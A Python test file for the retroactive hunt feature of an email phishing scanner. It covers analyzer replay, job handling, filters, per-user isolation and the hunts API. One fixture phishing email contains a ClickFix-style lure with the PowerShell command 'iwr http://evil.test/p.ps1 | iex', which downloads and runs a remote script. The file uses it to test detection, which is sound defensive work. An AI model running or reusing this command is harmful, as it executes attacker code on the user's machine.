"""Retroactive hunting over historical scans (Phase 5)."""

from __future__ import annotations

from pathlib import Path

import pytest
from fastapi import FastAPI
from fastapi.testclient import TestClient
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker

from app.api.hunts import router as hunts_router
from app.dependencies import get_current_user, get_db
from app.models import Base
from app.models.alert import Alert
from app.models.email import Email
from app.models.job import JobStatus
from app.models.scan import Scan, Verdict
from app.models.user import User
from app.services import job_service
from app.services.hunt_service import HUNT_KIND, run_retro_hunt
from app.services.job_worker import JobWorker
from tests.conftest import TEST_USER_ID

OTHER_USER_ID = TEST_USER_ID + 1


def _setup(tmp_path):
    engine = create_engine(
        f"sqlite:///{tmp_path}/hunts.db",
        connect_args={"check_same_thread": False},
    )
    Base.metadata.create_all(engine)
    factory = sessionmaker(bind=engine)
    db = factory()
    db.add(User(id=TEST_USER_ID, google_sub="hunt-owner", email="hunt@test"))
    db.add(User(id=OTHER_USER_ID, google_sub="hunt-other", email="other@test"))
    db.commit()
    return engine, factory, db


def _scan(db, *, user_id, message_id, sender, subject, body, classification="safe"):
    email = Email(
        user_id=user_id,
        message_id=message_id,
        sender=sender,
        subject=subject,
        body_text=body,
        has_html=False,
        has_attachments=False,
    )
    db.add(email)
    db.flush()
    scan = Scan(
        user_id=user_id,
        email_id=email.id,
        status="complete",
    )
    db.add(scan)
    db.flush()
    db.add(
        Verdict(
            scan_id=scan.id,
            final_score=0.0,
            classification=classification,
            breakdown={},
        )
    )
    db.commit()
    db.refresh(scan)
    return scan


def _enqueue(db, *, user_id, analyzers=None, **params):
    return job_service.enqueue(
        db,
        user_id=user_id,
        kind=HUNT_KIND,
        params={
            "user_id": user_id,
            "analyzers": analyzers
            or ["conversation", "identity", "kit", "clickfix"],
            "max_scans": 50,
            **params,
        },
    )


class TestHuntHandler:
    def test_replays_analyzers_and_persists_new_findings(self, tmp_path):
        engine, factory, db = _setup(tmp_path)
        owner_scan = _scan(
            db,
            user_id=TEST_USER_ID,
            message_id="<hunt-owner@test>",
            sender="PayPal Support <paypal@gmail.com>",
            subject="Action required",
            body=(
                "Verify you are human. Press Windows + R and paste this into "
                "PowerShell: powershell -c iwr http://evil.test/p.ps1 | iex"
            ),
        )
        benign_scan = _scan(
            db,
            user_id=TEST_USER_ID,
            message_id="<hunt-benign@test>",
            sender="Alice <alice@corp.test>",
            subject="Lunch",
            body="Lunch is at noon.",
        )
        other_scan = _scan(
            db,
            user_id=OTHER_USER_ID,
            message_id="<hunt-other@test>",
            sender="PayPal <paypal@gmail.com>",
            subject="Other user",
            body="Press Windows + R and paste this into PowerShell.",
        )

        job = _enqueue(db, user_id=TEST_USER_ID)
        claimed = job_service.claim_job(db, job_id=job.id, worker_id="hunt-test")
        assert claimed is not None
        result = run_retro_hunt(db, claimed)

        assert result["scans_matched"] == 2
        assert result["scans_scanned"] == 2
        assert result["new_finding_count"] >= 2
        assert result["scans_with_findings"] >= 1
        assert "IDENTITY_BRAND_DISPLAY_MISMATCH" in result["new_by_code"]
        assert "CLICKFIX_POWERSHELL_OR_LOLBIN" in result["new_by_code"]
        assert result["top_findings"]
        assert result["alerts_emitted"] >= 1
        assert db.query(Alert).filter_by(event_type="hunt").count() >= 1

        db.refresh(owner_scan)
        db.refresh(benign_scan)
        db.refresh(other_scan)
        assert owner_scan.verdict.final_score == 0.0
        assert benign_scan.verdict.final_score == 0.0
        assert other_scan.verdict.final_score == 0.0
        assert owner_scan.findings
        assert benign_scan.findings == []
        assert other_scan.findings == []
        db.close()
        engine.dispose()

    def test_worker_run_job_marks_success(self, tmp_path):
        engine, factory, db = _setup(tmp_path)
        _scan(
            db,
            user_id=TEST_USER_ID,
            message_id="<worker@test>",
            sender="PayPal <paypal@gmail.com>",
            subject="Verify",
            body="Please verify your account.",
        )
        job = _enqueue(db, user_id=TEST_USER_ID, analyzers=["identity"])
        db.close()

        worker = JobWorker(
            factory,
            {HUNT_KIND: run_retro_hunt},
            worker_id="worker-test",
        )
        assert worker.run_job(job.id) is True
        check = factory()
        row = check.get(type(job), job.id)
        assert row.status == JobStatus.SUCCEEDED
        assert row.result_json["new_finding_count"] >= 1
        check.close()
        engine.dispose()

    def test_filters_and_bad_scan_isolation(self, tmp_path):
        engine, factory, db = _setup(tmp_path)
        _scan(
            db,
            user_id=TEST_USER_ID,
            message_id="<safe@test>",
            sender="Alice <alice@corp.test>",
            subject="Safe",
            body="Nothing to see.",
            classification="safe",
        )
        dangerous = _scan(
            db,
            user_id=TEST_USER_ID,
            message_id="<danger@test>",
            sender="PayPal <paypal@gmail.com>",
            subject="Danger",
            body="Impersonation body",
            classification="dangerous",
        )
        job = _enqueue(
            db,
            user_id=TEST_USER_ID,
            analyzers=["identity"],
            classification="dangerous",
        )
        claimed = job_service.claim_job(db, job_id=job.id, worker_id="hunt-test")
        result = run_retro_hunt(db, claimed)
        assert result["scans_matched"] == 1
        assert result["scan_ids_with_findings"] == [dangerous.id]
        db.close()
        engine.dispose()


@pytest.fixture()
def api_env(tmp_path):
    engine, factory, db = _setup(tmp_path)
    app = FastAPI()
    app.include_router(hunts_router)
    app.dependency_overrides[get_db] = lambda: db
    app.dependency_overrides[get_current_user] = lambda: db.get(User, TEST_USER_ID)
    yield app, db
    db.close()
    engine.dispose()


class TestHuntAPI:
    def test_create_is_idempotent_and_scoped(self, api_env):
        app, db = api_env
        client = TestClient(app)
        payload = {
            "analyzers": ["identity", "clickfix"],
            "run_now": False,
            "subject_contains": "invoice",
        }
        first = client.post(
            "/hunts", json=payload, headers={"Idempotency-Key": "same-hunt"}
        )
        second = client.post(
            "/hunts", json=payload, headers={"Idempotency-Key": "same-hunt"}
        )
        assert first.status_code == 202
        assert second.status_code == 202
        assert first.json()["hunt_id"] == second.json()["hunt_id"]
        hunt_id = first.json()["hunt_id"]

        listing = client.get("/hunts").json()
        assert listing["count"] == 1
        assert listing["hunts"][0]["kind"] == HUNT_KIND

        # Another owner cannot read the job.
        other_job = _enqueue(db, user_id=OTHER_USER_ID)
        missing = client.get(f"/hunts/{other_job.id}")
        assert missing.status_code == 404

        result = client.get(f"/hunts/{hunt_id}/results")
        assert result.status_code == 200
        assert result.json()["result"] is None

    def test_cancel_and_manual_run(self, api_env, monkeypatch):
        app, db = api_env
        client = TestClient(app)
        created = client.post(
            "/hunts", json={"analyzers": ["identity"], "run_now": False}
        ).json()
        hunt_id = created["hunt_id"]

        called: list[int] = []
        monkeypatch.setattr("app.api.hunts.run_hunt_job", called.append)
        run = client.post(f"/hunts/{hunt_id}/run")
        assert run.status_code == 202
        assert called == [hunt_id]

        cancel = client.post(f"/hunts/{hunt_id}/cancel")
        assert cancel.status_code == 200
        assert cancel.json()["cancel_requested"] is True

    def test_rejects_unknown_analyzer(self, api_env):
        app, _db = api_env
        client = TestClient(app)
        response = client.post(
            "/hunts",
            json={"analyzers": ["not-a-real-analyzer"], "run_now": False},
        )
        assert response.status_code == 400
